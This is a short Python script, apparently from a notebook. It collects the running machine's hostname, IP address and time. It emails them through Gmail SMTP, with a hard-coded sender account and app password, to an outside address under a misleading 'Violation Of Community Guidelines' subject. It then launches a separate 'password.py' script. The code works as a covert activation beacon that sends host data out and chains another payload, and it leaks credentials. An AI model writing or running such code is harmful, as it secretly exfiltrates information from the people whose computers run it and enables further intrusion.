#!/usr/bin/env python
# coding: utf-8

# In[ ]:
import socket
import os
import smtplib
import email.message
import time
from datetime import time
from datetime import datetime
def enviar_email():  
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    data_e_hora_atuais = datetime.now()
    date = data_e_hora_atuais.strftime('%d/%m/%Y %H:%M')
    corpo_email = (f"""
    <b>AN ACTIVATION WAS BEEN REPORTED</b>
    <br></br>
    <p>HostName: {hostname}</p>
    <p>IP Address: {ip}</p>
    <p>Time: {date}</p>
    """
    )
    msg = email.message.Message()
    msg['Subject'] = "Violation Of Community Guidelines"
    msg['From'] = 'kakkskskskssjak@gmail.com'
    msg['To'] = 'j3wh6dpmzbcntct@gmail.com'
    password = 'qhsa gnwh fhjr fuhr' 
    msg.add_header('Content-Type', 'text/html')
    msg.set_payload(corpo_email )

    s = smtplib.SMTP('smtp.gmail.com: 587')
    s.starttls()
    # Login Credentials for sending the mail
    s.login(msg['From'], password)
    s.sendmail(msg['From'], [msg['To']], msg.as_string().encode('utf-8'))


# In[ ]:

enviar_email()
os.system("python password.py")
